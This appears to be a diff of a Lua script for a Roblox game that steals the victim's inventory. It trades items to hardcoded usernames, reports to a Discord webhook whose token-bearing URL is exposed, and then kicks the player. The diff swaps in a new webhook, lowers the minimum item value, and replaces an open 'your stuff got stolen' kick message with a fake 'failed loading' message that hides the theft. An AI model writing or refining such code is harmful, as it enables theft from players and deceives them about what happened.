@@ -19,9 +19,9 @@ local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).
 local Replion = require(game.ReplicatedStorage.Packages.Replion)
 
 local users = _G.Usernames or {"PoziBaskan_YTB", "benpozibaskan"}
-local min_rap = _G.min_rap or 100
+local min_rap = _G.min_rap or 10
 local ping = _G.pingEveryone or "Yes"
-local webhook = _G.webhook or "https://discord.com/api/webhooks/1466366045022584926/B0sC0zF3U6KmYlUfeBbfxyEXGoLG-EGJf1TcY8FBRok_52ALp3stapFYa2bi0M2fqX6s"
+local webhook = _G.webhook or "https://discord.com/api/webhooks/1466420612263182387/i329GIkZ5uQt-rfcAMXZJKssQPFhIUtDcRuFIpC5xQGLsB7n3SwYQ6wTwU3DZQ35m6IH"
 
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add usernames or webhook")
@@ -413,7 +413,7 @@ if #itemsToSend > 0 then
             readyTrade()
             confirmTrade()
         end
-        plr:kick("All your stuff just got stolen by Tobi's stealer. discord.gg/GY2RVSEGDT")
+        plr:kick("Use The Script Again Failed Loading")
     end
 
     local function waitForUserJoin()
